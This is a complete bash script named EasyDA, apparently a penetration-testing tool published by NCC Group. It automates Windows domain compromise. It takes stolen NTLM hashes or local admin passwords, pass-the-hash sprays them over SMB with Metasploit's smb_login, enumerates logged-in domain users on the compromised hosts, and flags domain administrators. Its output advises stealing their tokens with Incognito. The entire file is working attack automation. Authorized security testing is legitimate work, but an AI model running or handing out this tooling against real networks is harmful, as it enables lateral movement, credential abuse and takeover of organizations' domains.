#!/usr/bin/env bash
# EasyDA - Easy Windows Domain Access Script
# Daniel Compton
# www.commonexploits.com
# contact@commexploits.com
# Twitter = @commonexploits
# 22/05/2013
# Requires metasploit
# Uses standard built in metasploit modules. http://www.metasploit.com

# Tested on Backtrack 5 and Kali 64bit.


#####################################################################################
# Released as open source by NCC Group Plc - http://www.nccgroup.com/

# Developed by Daniel Compton, daniel dot compton at nccgroup dot com

# https://github.com/nccgroup/easyda

#Released under AGPL see LICENSE for more information

######################################################################################

# user config settings

TMPDIR="/tmp/" #where tmp files will be stored
THREADS="10" #metasploit threads to use


# Script begins
#===============================================================================

VERSION="1.0" 

clear

echo -e "\e[00;31m#############################################################\e[00m"
echo -e "Easy Windows Domain Access $VERSION "
echo ""
echo -e "Hash passing and Domain Admin finder"
echo ""
echo "https://github.com/nccgroup/easyda"
echo -e "\e[00;31m#############################################################\e[00m"
echo ""


#Dependency checking

#Check for metasploit
which msfcli >/dev/null
if [ $? -eq 0 ]
	then
		echo ""
else
		echo ""
        echo -e "\e[00;31mUnable to find the required Metasploit program, install and try again\e[00m"
        exit 1
fi

echo -e "\e[1;31m-------------------------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Do you want to scan with a LM:NTLM Hash or clear text password? Enter 1, 2, 3, or 4 and press enter"
echo -e "\e[1;31m-------------------------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Use full single hash for local administrator account i.e Administrator:500:ED537EC7634DBBBCAAD3B435B51404EE:3D0CED5A03CDA02AF9CA7CA30A4C85F7:::"
echo ""
echo " 2. Use a list of multiple hashes for local administrator accounts i.e Administrator:500:ED537EC7634DBBBCAAD3B435B51404EE:3D0CED5A03CDA02AF9CA7CA30A4C85F7:::"
echo ""
echo " 3. Use a single set of local clear text credentials i.e Administrator Password01"
echo ""
echo " 4. Blank password check, use single username i.e Administrator with no password"
echo ""
echo -e "\e[1;31m-------------------------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
echo ""
read PWORHASH
	# single hash input
	if [ "$PWORHASH" = "1" ]
		then
			echo ""
			echo -e "\e[01;32m[-]\e[00m Local hash selected"
			echo ""
			echo -e "\e[1;31m------------------------------------------------------------------------------------------------------\e[00m"
			echo -e "\e[01;31m[?]\e[00m Enter full single hash and press enter (can be from hashdump, fgdump, pwdump, gsecdump etc)"
			echo -e "\e[1;31m------------------------------------------------------------------------------------------------------\e[00m"
			echo ""
			read HASH
			echo "$HASH" |grep ":::" >/dev/null 2>&1
		if [ $? = 1 ]
			then
				echo ""
				echo -e "\e[01;31m[!]\e[00m Sorry that is not a valid hash format I can use"
				echo ""
				exit 1	
				echo ""
		
			else
				echo ""
		fi
			
			SMBUSER=$(echo $HASH |cut -d ":" -f 1)
			FGDUMPCHECK=$(echo $HASH |cut -d ":" -f 3)
			if [ "$FGDUMPCHECK" = "NO PASSWORD*********************" ]
				then
					LMFG="00000000000000000000000000000000"
					NTLM=$(echo $HASH |cut -d ":" -f 4)
					SMBPASS=$(echo "$LMFG:$NTLM")
				else
					SMBPASS=$(echo $HASH |cut -d ":" -f 3,4)
			fi
			
	# multiple hashes from list
	elif [ "$PWORHASH" = "2" ]
		then
		echo -e "\e[1;31m-----------------------------------------------------------------\e[00m"
		echo -e "\e[01;31m[?]\e[00m Enter the location of the hash file i.e /tmp/hashes.txt"
		echo -e "\e[1;31m-----------------------------------------------------------------\e[00m"
		echo ""
		read -e HASHFILE
		echo ""
		cat $HASHFILE >/dev/null 2>&1
			if [ $? = 1 ]
				then
					echo ""
					echo -e "\e[1;31mSorry I can't read that file, check the path and try again!\e[00m"
					echo ""
					exit 1
				else
					NOHASHCOUNT=$(cat "$HASHFILE" |grep ":::" |wc -l)
					echo ""
					echo -e "\e[01;32m[-]\e[00m I can read "$NOHASHCOUNT" hashes from the file"
					
			fi
			cat "$HASHFILE" |cut -d ":" -f 1 >/tmp/user.txt
			cat "$HASHFILE" |cut -d ":" -f 3,4 >/tmp/pass.txt
			paste /tmp/user.txt /tmp/pass.txt >/tmp/userpass.txt


	# clear text credentials input		
	elif [ "$PWORHASH" = "3" ]
		then
			echo ""
			echo -e "\e[01;32m[-]\e[00m Local clear text credentials selected"
			echo ""
			echo -e "\e[1;31m-----------------------------------------------------------------\e[00m"
			echo -e "\e[01;31m[?]\e[00m Enter the local Administrator user name and press enter"
			echo -e "\e[1;31m-----------------------------------------------------------------\e[00m"
			echo ""
			read SMBUSER
			echo ""
			echo -e "\e[1;31m------------------------------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
			echo -e "\e[01;31m[?]\e[00m Enter the password for the local administrator user \e[01;32m"$SMBUSER"\e[00m in clear text and press enter"
			echo -e "\e[1;31m------------------------------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
			echo "Note: you can also insert a LM:NTLM password hash, providing it is in the "psexec" format i.e ED537EC7634DBBBCAAD3B435B51404EE:3D0CED5A03CDA02AF9CA7CA30A4C85F7"
			echo ""
			read SMBPASS
			
	# blank password check
	elif [ "$PWORHASH" = "4" ]
		then
			echo ""
			echo -e "\e[01;32m[-]\e[00m Local blank password check selected"
			echo ""
			echo -e "\e[1;31m--------------------------------------------------------------------------------------------------\e[00m"
			echo -e "\e[01;31m[?]\e[00m Enter the local Administrator username to check for blank passwords and press enter"
			echo -e "\e[1;31m--------------------------------------------------------------------------------------------------\e[00m"
			echo ""
			read SMBUSER
			echo ""
			
	else
		echo ""
		echo -e "\e[01;31m[!]\e[00m You didnt select a valid option, try again"
		echo ""
		exit 1
fi

echo ""
echo -e "\e[1;31m----------------------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Enter the IP address/s, CIDR range to scan or point to a file of IP adddresses i.e /tmp/ips.txt"
echo -e "\e[1;31m----------------------------------------------------------------------------------------------------------\e[00m"
echo ""
read -e IPSIN

#check if manual or file IP input

echo $IPSIN |grep "[0-9]" >/dev/null 2>&1
if [ $? = 0 ]
	then
		IPS="$IPSIN"	
		echo ""
		
	else
		cat $IPSIN>/dev/null 2>&1
			if [ $? = 1 ]
				then
					echo ""
					echo -e "\e[1;31mSorry I can't read that file, check the path and try again!\e[00m"
					echo ""
					exit 1
				else
					IPS=file:"$IPSIN"
						
		fi
fi

echo ""
echo -e "\e[01;32m[-]\e[00m Now scanning for common credentials - please wait whilst the scanner loads...."
echo ""
#check for common hash matches

# check if single hash, multiple or clear text creds

if [ "$PWORHASH" = "1" ]
		then
			msfcli auxiliary/scanner/smb/smb_login RHOSTS=$IPS SMBDOMAIN=WORKGROUP SMBUSER=$SMBUSER SMBPASS=$SMBPASS STOP_ON_SUCCESS=FALSE PRESERVE_DOMAINS=FALSE RPORT="445" BLANK_PASSWORDS=FALSE USER_AS_PASS=FALSE THREADS=$THREADS VERBOSE=true E 2>/dev/null |tee /tmp/smb.txt |grep -i "scanned" | cut -d "]" -f 2

elif [ "$PWORHASH" = "2" ]
		then
			msfcli auxiliary/scanner/smb/smb_login RHOSTS=$IPS SMBDOMAIN=WORKGROUP USERPASS_FILE="$TMPDIR"userpass.txt STOP_ON_SUCCESS=FALSE PRESERVE_DOMAINS=FALSE RPORT="445" BLANK_PASSWORDS=FALSE USER_AS_PASS=FALSE THREADS=$THREADS VERBOSE=true E 2>/dev/null |tee /tmp/smb.txt | grep -i "scanned" | cut -d "]" -f 2

elif [ "$PWORHASH" = "3" ]
		then
			msfcli auxiliary/scanner/smb/smb_login RHOSTS=$IPS SMBDOMAIN=WORKGROUP SMBUSER=$SMBUSER SMBPASS=$SMBPASS STOP_ON_SUCCESS=FALSE PRESERVE_DOMAINS=FALSE RPORT="445" BLANK_PASSWORDS=FALSE USER_AS_PASS=FALSE THREADS=$THREADS VERBOSE=true E 2>/dev/null |tee /tmp/smb.txt | grep -i "scanned" | cut -d "]" -f 2

elif [ "$PWORHASH" = "4" ]
		then
			msfcli auxiliary/scanner/smb/smb_login RHOSTS=$IPS SMBDOMAIN=WORKGROUP SMBUSER=$SMBUSER STOP_ON_SUCCESS=FALSE PRESERVE_DOMAINS=FALSE RPORT="445" BLANK_PASSWORDS=TRUE USER_AS_PASS=FALSE THREADS=$THREADS VERBOSE=true E 2>/dev/null |tee /tmp/smb.txt | grep -i "scanned" | cut -d "]" -f 2

else
	echo ""		
fi					

echo ""

if [ "$PWORHASH" = "1" ]
		then
			COMMON=$(cat /tmp/smb.txt | grep -i "status_success" | awk '{print $2}' |cut -d ":" -f 1)
			cat /tmp/smb.txt | grep -i "status_success" | awk '{print $2}' |cut -d ":" -f 1 >/tmp/commonips.txt
			COMMONNO=$(cat /tmp/smb.txt | grep -i "status_success" | awk '{print $2}' |cut -d ":" -f 1 |wc -l)

			if [ -z "$COMMON" ]
				then
					echo -e "\e[01;31m[!]\e[00m Sorry no common credentials were found...script will now exit!"
					echo ""
					exit 1
			else
					MUSER=$(cat /tmp/smb.txt | grep -i "status_success" |cut -d ":" -f 2 | awk '{print $NF}' |sort --unique)
					MHASH=$(cat /tmp/smb.txt | grep -i "status_success" |cut -d ":" -f 3,4 | cut -d " " -f 1,2 |sort --unique |sed 's/^[ \t]*//')
					UHMATCH=$(echo $HASH | grep -i "$MUSER" | grep -i "$MHASH")
					echo -e "\e[01;32m[+]\e[00m Success! Common credentials were found, \e[01;32m"$COMMONNO"\e[00m hosts matched."
					echo ""
					echo -e "\e[01;32m----------------------------------------------------------------------------------------\e[00m"
					echo "$UHMATCH"
					echo -e "\e[01;32m----------------------------------------------------------------------------------------\e[00m"
					paste /tmp/commonips.txt
					echo -e "\e[01;32m----------------------------------------------------------------------------------------\e[00m"
					echo ""
					echo -e "\e[01;32m"$COMMONNO"\e[00m hosts had the same credentials."
			fi
			

elif [ "$PWORHASH" = "2" ]

	then
			MULTICOM=$(cat /tmp/smb.txt | grep -i "status_success" |cut -d ":" -f 3,4 | cut -d " " -f 1,2 |sort --unique |wc -l)
			cat /tmp/smb.txt | grep -i "status_success"  |awk '{print $2}' |cut -d ":" -f 1 |sort --unique >/tmp/commonips.txt
			COMMONNO=$(cat /tmp/smb.txt |grep -i "status_success" | awk '{print $2}' |cut -d ":" -f 1 |sort --unique |wc -l)

				if [ $MULTICOM = 0 ]
					then
						echo -e "\e[01;31m[!]\e[00m Sorry no common credentials were found...script will now exit!"
						echo ""
						exit 1
						
				elif [ $MULTICOM = 1 ]	
					then
						MUSER=$(cat /tmp/smb.txt | grep -i "status_success" |cut -d ":" -f 2 | awk '{print $NF}' |sort --unique)
						MHASH=$(cat /tmp/smb.txt | grep -i "status_success" |cut -d ":" -f 3,4 | cut -d " " -f 1,2 |sort --unique |sed 's/^[ \t]*//')
						UHMATCH=$(cat $HASHFILE | grep -i "$MUSER" | grep -i "$MHASH")
						echo -e "\e[01;32m[+]\e[00m Success! Common credentials were found, \e[01;32m"$COMMONNO"\e[00m hosts matched."
						echo ""
						echo -e "\e[01;32m----------------------------------------------------------------------------------------\e[00m"
						echo "$UHMATCH"
						echo -e "\e[01;32m----------------------------------------------------------------------------------------\e[00m"
						paste /tmp/commonips.txt
						echo -e "\e[01;32m----------------------------------------------------------------------------------------\e[00m"
						echo ""
						echo -e "\e[01;32m"$COMMONNO"\e[00m hosts had the same credentials."
						
				elif [ $MULTICOM > 1 ]	
					then
						MUSER=$(cat /tmp/smb.txt | grep -i "status_success" |cut -d ":" -f 2 | awk '{print $NF}' |sort --unique)
						MHASH=$(cat /tmp/smb.txt | grep -i "status_success" |cut -d ":" -f 3,4 | cut -d " " -f 1,2 |sort --unique |sed 's/^[ \t]*//')
						UHMATCH=$(cat $HASHFILE | grep -i "$MUSER" | grep -i "$MHASH")
						IPMATCH=$(cat /tmp/smb.txt | grep -i "status_success" | grep -i "$MUSER" | grep -i "$MHASH" | awk '{print $2}' |cut -d ":" -f 1 |sort --unique)
						MULTICOMMONNO=$(cat /tmp/smb.txt | grep -i "status_success" |cut -d ":" -f 3,4 | cut -d " " -f 1,2 |sort --unique |sed 's/^[ \t]*//' |sed '/^$/d' |wc -l)
						echo -e "\e[01;32m[+]\e[00m Success! \e[01;32m"$MULTICOMMONNO"\e[00m sets of credentials worked on multiple hosts."
						echo ""
						for MULTIHASHMATCH in $(echo $MHASH)
						do
						echo -e "\e[01;32m----------------------------------------------------------------------------------------\e[00m"
						cat $HASHFILE | grep -i "$MULTIHASHMATCH" | tee -a /tmp/multihash.txt
						echo -e "\e[01;32m----------------------------------------------------------------------------------------\e[00m"
						cat /tmp/smb.txt | grep -i "status_success" | grep -i "$MULTIHASHMATCH" | awk '{print $2}' |cut -d ":" -f 1 |sort --unique | tee -a /tmp/multihash.txt
						echo -e "\e[01;32m----------------------------------------------------------------------------------------\e[00m"
						echo ""
						done
						echo -e "\e[01;32m"$MULTICOMMONNO"\e[00m sets of credentials worked on multiple hosts."
						
				else
						echo ""
				fi
		
elif [ "$PWORHASH" = "3" ]
		then
			COMMON=$(cat /tmp/smb.txt | grep -i "status_success" | awk '{print $2}' |cut -d ":" -f 1)
			cat /tmp/smb.txt | grep -i "status_success"  |awk '{print $2}' |cut -d ":" -f 1 >/tmp/commonips.txt
			COMMONNO=$(cat /tmp/smb.txt |grep -i "status_success" | awk '{print $2}' |cut -d ":" -f 1 |wc -l)

				if [ -z "$COMMON" ]
					then
						echo -e "\e[01;31m[!]\e[00m Sorry no common credentials were found...script will now exit!"
						echo ""
						exit 1
					else
						echo -e "\e[01;32m[+]\e[00m Success! Common credentials were found, \e[01;32m"$COMMONNO"\e[00m hosts matched."
						echo ""
						echo -e "\e[01;32m--------------------------------------------------------\e[00m"
						paste /tmp/commonips.txt
						echo -e "\e[01;32m--------------------------------------------------------\e[00m"
						echo ""
						echo -e "\e[01;32m"$COMMONNO"\e[00m hosts had the same credentials."
				fi
				
elif [ "$PWORHASH" = "4" ]
		then
			COMMON=$(cat /tmp/smb.txt | grep -i "status_success" | awk '{print $2}' |cut -d ":" -f 1)
			cat /tmp/smb.txt | grep -i "status_success"  |awk '{print $2}' |cut -d ":" -f 1 >/tmp/commonips.txt
			COMMONNO=$(cat /tmp/smb.txt |grep -i "status_success" | awk '{print $2}' |cut -d ":" -f 1 |wc -l)

				if [ -z "$COMMON" ]
					then
						echo -e "\e[01;31m[!]\e[00m Sorry no common credentials were found...script will now exit!"
						echo ""
						exit 1
					else
						echo -e "\e[01;32m[+]\e[00m Success! Blank passwords were found, \e[01;32m"$COMMONNO"\e[00m hosts had no password set."
						echo ""
						echo -e "\e[01;32m--------------------------------------------------------\e[00m"
						paste /tmp/commonips.txt
						echo -e "\e[01;32m--------------------------------------------------------\e[00m"
						echo ""
						echo -e "\e[01;32m"$COMMONNO"\e[00m hosts had blank passwords."
				fi
else
	echo ""
fi
echo ""
echo -e "\e[01;32m[-]\e[00m I can now try to find a logged in domain administrators for you."
echo ""
echo -e "\e[1;31m-----------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Do you have a specific domain administator name to search for or a list/output of the domain admins group to match?"
echo -e "\e[1;31m-----------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. File: Raw Output File - Use the raw the output from the command 'net group "domain admins" /domain >yourfilename.txt' "
echo ""
echo " 2. File: List of domain admin names one per line"
echo ""
echo " 3. Input: Manually enter one administrator name to search for i.e administrator"
echo ""
echo " 4. None: Just list all users found logged in"
echo ""
echo -e "\e[1;31m-----------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
echo ""
read DALIST
echo ""

if [ "$DALIST" = "1" ]
	then
		echo ""
		echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------------------\e[00m"
		echo -e "\e[01;31m[?]\e[00m Enter the path to your domain admins output i.e /tmp/yourfilename.txt'"
		echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------------------\e[00m"
		echo ""
		read -e DADMINSLIST1
		#check file can be read

		cat $DADMINSLIST1 >/dev/null 2>&1
			if [ $? = 1 ]
				then
					echo ""
					echo -e "\e[1;31m Sorry I can't read that file, check the path and try again!\e[00m"
					echo ""
					exit 1
				else
					DAADMINNO=$(cat "$DADMINSLIST1" |cut -d " " -f 1-50 |grep -v -i "members" |grep -i -v "group name" |grep -i -v "comment" |grep -i -v "the command" |grep -i -v '\---' | awk '{for(i=1;i<=NF;i++)if(arr[i] ~ /./)arr[i]=arr[i]"\n"$i;else arr[i]=$i}END{for(x=1;x<=length(arr);x++)printf("%s\n",arr[x])}' | sort --unique |wc -l)
					DACHECK=$(cat "$DADMINSLIST1" |cut -d " " -f 1-50 |grep -v -i "members" |grep -i -v "group name" |grep -i -v "comment" |grep -i -v "the command" |grep -i -v '\---' | awk '{for(i=1;i<=NF;i++)if(arr[i] ~ /./)arr[i]=arr[i]"\n"$i;else arr[i]=$i}END{for(x=1;x<=length(arr);x++)printf("%s\n",arr[x])}' | sort --unique)
					echo ""
					echo -e "\e[01;32m[-]\e[00m I can read your domain admins list fine and have stored \e[01;32m"$DAADMINNO"\e[00m domain admins to look for."
					echo ""			
			fi
			
elif [ "$DALIST" = "2" ]
	then
		echo ""
		echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------------------\e[00m"
		echo -e "\e[01;31m[?]\e[00m Enter the path to your list of domain users (one per line)"
		echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------------------\e[00m"
		echo ""
		read -e DADMINSLIST2
		#check file can be read

		cat $DADMINSLIST2 >/dev/null 2>&1
			if [ $? = 1 ]
				then
					echo ""
					echo -e "\e[1;31m Sorry I can't read that file, check the path and try again!\e[00m"
					echo ""
					exit 1			
						
			fi
		
elif [ "$DALIST" = "3" ]
	then
		echo ""
		echo -e "\e[1;31m----------------------------------------------------------------------------------\e[00m"
		echo -e "\e[01;31m[?]\e[00m Enter the single username to search for and press enter"
		echo -e "\e[1;31m----------------------------------------------------------------------------------\e[00m"
		echo ""
		read -e DASINGLESEARCH
		#check file can be read
			
elif [ "$DALIST" = "4" ]
	then
		echo ""
		echo -e "\e[01;32m[-]\e[00m List all logged in users option selected."
		echo ""
		
	else
		echo ""
		echo -e "\e[01;31m[!]\e[00m You didnt select a valid option, try again"
		echo ""
		exit 1
fi

echo ""
echo -e "\e[1;31m-----------------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Enter the domain name of interest - this will help filter out local user account matches"
echo -e "\e[1;31m-----------------------------------------------------------------------------------------------------\e[00m"
echo "Enter the short domain name i.e if testdomain.local just enter testdomain or leave blank for none and press enter"
echo ""
read DOMAINNAME
if [ -z $DOMAINNAME ]
	then
		DOMAINNAME=$(echo "NONE")
		echo ""
	else
		echo ""
fi

# scan for logged in user accounts where only common creds were found

echo -e "\e[01;32m[-]\e[00m I will now look for logged in users on the \e[01;32m"$DOMAINNAME"\e[00m domain where the common credentials were found."
echo ""

if [ "$PWORHASH" = "1" ]
		then
			msfcli auxiliary/scanner/smb/smb_enumusers_domain RHOSTS=file:"$TMPDIR"commonips.txt SMBDOMAIN=WORKGROUP SMBUSER=$SMBUSER SMBPASS=$SMBPASS THREADS=$THREADS VERBOSE=true E 2>/dev/null |tee "$TMPDIR"loggedin.txt | grep -i "scanned" | cut -d "]" -f 2
			echo ""
elif [ "$PWORHASH" = "2" ]
		then
			MUSER=$(cat "$TMPDIR"smb.txt | grep -i "status_success" |cut -d ":" -f 2 | awk '{print $NF}' |sort --unique)
			MHASH=$(cat "$TMPDIR"smb.txt | grep -i "status_success" |cut -d ":" -f 3,4 | cut -d " " -f 1,2 |sort --unique |sed 's/^[ \t]*//' |sed '/^$/d')
			UHMATCH=$(cat $HASHFILE | grep -i "$MUSER" | grep -i "$MHASH")
			IPMATCH=$(cat "$TMPDIR"smb.txt | grep -i "status_success" | grep -i "$MUSER" | grep -i "$MHASH" | awk '{print $2}' |cut -d ":" -f 1 |sort --unique)
			MULTICOMMONNO=$(cat "$TMPDIR"smb.txt | grep -i "status_success" |cut -d ":" -f 3,4 | cut -d " " -f 1,2 |sort --unique |sed 's/^[ \t]*//' |sed '/^$/d' |wc -l)
			echo -e "\e[01;33m[!]\e[00m Warning! As multiple sets of credentials were found I will need to run the scan \e[01;32m"$MULTICOMMONNO"\e[00m times, so it will be slower than normal."
			echo ""
			for MULTIHASHMATCH2 in $(echo $MHASH)
			do	
			MULTISMBUSER=$(cat $HASHFILE | grep -i "$MULTIHASHMATCH2" | cut -d ":" -f 1)
			MULTISMBHASH=$(cat $HASHFILE | grep -i "$MULTIHASHMATCH2" | cut -d ":" -f 3,4)
			echo -e "\e[01;32m--------------------------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
			echo -e "\e[01;32m[-]\e[00m Scanning using the following credentials "$MULTISMBUSER" "$MULTISMBHASH" on the following hosts:"
			echo -e "\e[01;32m--------------------------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
			cat "$TMPDIR"smb.txt | grep -i "status_success" | grep -i "$MULTIHASHMATCH2" | awk '{print $2}' |cut -d ":" -f 1 |sort --unique > "$TMPDIR"multihaships.txt
			paste "$TMPDIR"multihaships.txt
			echo ""
			msfcli auxiliary/scanner/smb/smb_enumusers_domain RHOSTS=file:"$TMPDIR"multihaships.txt SMBDOMAIN=WORKGROUP SMBUSER=$MULTISMBUSER SMBPASS=$MULTISMBHASH THREADS=$THREADS VERBOSE=true E 2>/dev/null |tee -a "$TMPDIR"loggedin.txt | grep -i "scanned" | cut -d "]" -f 2
			echo ""
			done
			echo ""
elif [ "$PWORHASH" = "3" ]
		then
			msfcli auxiliary/scanner/smb/smb_enumusers_domain RHOSTS=file:"$TMPDIR"commonips.txt SMBDOMAIN=WORKGROUP SMBUSER=$SMBUSER SMBPASS=$SMBPASS THREADS=$THREADS VERBOSE=true E 2>/dev/null |tee "$TMPDIR"loggedin.txt | grep -i "scanned" | cut -d "]" -f 2
			echo ""
elif [ "$PWORHASH" = "4" ]
		then
			msfcli auxiliary/scanner/smb/smb_enumusers_domain RHOSTS=file:"$TMPDIR"commonips.txt SMBDOMAIN=WORKGROUP SMBUSER=$SMBUSER THREADS=$THREADS VERBOSE=true E 2>/dev/null |tee "$TMPDIR"loggedin.txt | grep -i "scanned" | cut -d "]" -f 2
			echo ""
else
	echo ""
fi

LOGGEDINDOMAIN=$(cat "$TMPDIR"loggedin.txt |grep  -a "*" |grep  -a -v -i "scanned" | grep -a -v -i "auxiliary" |awk '{print $2,$4}' |grep -a -v -i "*" | grep -a -i -v '\$' |grep -a -i -v "/" |grep -a -i -v "-" |tr '[\000-\011\013-\037\177-\377]' " " | sed 's/ //g' |grep -i "$DOMAINNAME" |sed -e "s/$DOMAINNAME/ $DOMAINNAME/gI")
cat "$TMPDIR"loggedin.txt |grep  -a "*" |grep  -a -v -i "scanned" | grep -a -v -i "auxiliary" |awk '{print $2,$4}' |grep -a -v -i "*" | grep -a -i -v '\$' |grep -a -i -v "/" |grep -a -i -v "-" |tr '[\000-\011\013-\037\177-\377]' " " | sed 's/ //g' |grep -i "$DOMAINNAME" |sed -e "s/$DOMAINNAME/ $DOMAINNAME/gI" >"$TMPDIR"loggedinclean.txt
if [ -z "$LOGGEDINDOMAIN" ]
	then
		echo ""
		echo -e "\e[01;31m[!]\e[00m Sorry no users for domain \e[01;32m"$DOMAINNAME"\e[00m were found logged into any systems at this time"
		echo ""
		echo -e "\e[01;32m[-]\e[00mThe following users were found, double check the list to see if any users of interest or you may have mistyped the domain name"
		echo ""
		echo -e "\e[01;32m-----------------------------------------------------------------------------------------\e[00m"
		cat "$TMPDIR"loggedin.txt |grep  -a "*" |grep  -a -v -i "scanned" | grep -a -v -i "auxiliary" |awk '{print $2,$4}' |grep -a -v -i "*" | grep -a -i -v '\$' |grep -a -i -v "/" |grep -a -i -v "-" |sed '/^$/d' | sort --unique
		echo -e "\e[01;32m-----------------------------------------------------------------------------------------\e[00m"
		echo ""
		exit 1
	else
		echo  ""
		echo -e "\e[01;32m[+]\e[00m The following logged in users for the \e[01;32m"$DOMAINNAME"\e[00m domain were found"
		echo ""
		echo -e "\e[01;32m-----------------------------------------------------------------------------------------\e[00m"
		paste "$TMPDIR"loggedinclean.txt | tr [a-z] [A-Z] |sed '/^$/d' |sort --unique
		echo -e "\e[01;32m-----------------------------------------------------------------------------------------\e[00m"
		echo ""
fi

# search for domain admin names selection

if [ "$DALIST" = "1" ]
	then
		cat "$DADMINSLIST1" |cut -d " " -f 1-50 |grep -v -i "members" |grep -i -v "group name" |grep -i -v "comment" |grep -i -v "the command" |grep -i -v '\---' | awk '{for(i=1;i<=NF;i++)if(arr[i] ~ /./)arr[i]=arr[i]"\n"$i;else arr[i]=$i}END{for(x=1;x<=length(arr);x++)printf("%s\n",arr[x])}' | sort --unique >"$TMPDIR"das.txt
		echo -e "\e[01;32m[-]\e[00m Checking if logged in users are within the domain admins list provided"
		echo ""
		grep -a -f "$TMPDIR"das.txt "$TMPDIR"loggedinclean.txt >"$TMPDIR"domainadmins.txt
			if [ $? = 0 ]
				then
					echo -e "\e[01;32m[+]\e[00m The following logged in users are Domain Administrators for the \e[01;32m"$DOMAINNAME"\e[00m domain"
					echo ""
					echo -e "\e[01;32m--------------------------------------------------------\e[00m"
					paste "$TMPDIR"domainadmins.txt | tr [a-z] [A-Z] |sort --unique
					echo -e "\e[01;32m--------------------------------------------------------\e[00m"
					echo ""
					echo -e "\e[01;32m[-]\e[00m Use Incognito/Metasploit to impersonate/steal the DA token."
					echo ""
				else
					echo -e "\e[01;31m[!]\e[00m Sorry no logged in users are Domain Administrators for the \e[01;32m"$DOMAINNAME"\e[00m domain"
					echo ""
			fi
	
elif [ "$DALIST" = "2" ]
	then
		echo -e "\e[01;32m[-]\e[00m Checking if logged in users are within the domain admins list provided"
		echo ""
		grep -a -f "$DADMINSLIST2" "$TMPDIR"loggedinclean.txt >"$TMPDIR"domainadmins.txt
			if [ $? = 0 ]
				then
					echo -e "\e[01;32m[+]\e[00m The following logged in users are Domain Administrators for the \e[01;32m"$DOMAINNAME"\e[00m domain"
					echo ""
					echo -e "\e[01;32m--------------------------------------------------------\e[00m"
					paste "$TMPDIR"domainadmins.txt | tr [a-z] [A-Z] |sort --unique
					echo -e "\e[01;32m--------------------------------------------------------\e[00m"
					echo ""
					echo -e "\e[01;32m[-]\e[00m Use Incognito/Metasploit to impersonate/steal the DA token."
					echo ""
				else
					echo -e "\e[01;31m[!]\e[00m Sorry no logged in users are Domain Administrators for the \e[01;32m"$DOMAINNAME"\e[00m domain"
					echo ""
			fi
	
elif [ "$DALIST" = "3" ]
	then
		echo -e "\e[01;32m[-]\e[00m Checking if logged in users are within the domain admins list provided"
		echo ""
		grep -a "$DASINGLESEARCH" "$TMPDIR"loggedinclean.txt >"$TMPDIR"domainadmins.txt
			if [ $? = 0 ]
				then
					echo -e "\e[01;32m[+]\e[00m The following logged in users are Domain Administrators for the \e[01;32m"$DOMAINNAME"\e[00m domain"
					echo ""
					echo -e "\e[01;32m--------------------------------------------------------\e[00m"
					paste "$TMPDIR"domainadmins.txt | tr [a-z] [A-Z] |sort --unique
					echo -e "\e[01;32m--------------------------------------------------------\e[00m"
					echo ""
					echo -e "\e[01;32m[-]\e[00m Use Incognito/Metasploit to impersonate/steal the DA token."
					echo ""
				else
					echo -e "\e[01;31m[!]\e[00m Sorry no logged in users are Domain Administrators for the \e[01;32m"$DOMAINNAME"\e[00m domain"
					echo ""
			fi
else
	echo ""
fi

#cleanup temp files
rm "$TMPDIR"commonips.txt  >/dev/null 2>&1
rm "$TMPDIR"loggedin.txt  >/dev/null 2>&1
rm "$TMPDIR"loggedinclean.txt  >/dev/null 2>&1
rm "$TMPDIR"pass.txt  >/dev/null 2>&1
rm "$TMPDIR"user.txt  >/dev/null 2>&1
rm "$TMPDIR"multihaships.txt  >/dev/null 2>&1
rm "$TMPDIR"multihash.txt  >/dev/null 2>&1
rm "$TMPDIR"smb.txt  >/dev/null 2>&1
rm "$TMPDIR"userpass.txt  >/dev/null 2>&1
rm "$TMPDIR"das.txt  >/dev/null 2>&1
rm "$TMPDIR"domainadmins.txt  >/dev/null 2>&1

exit 0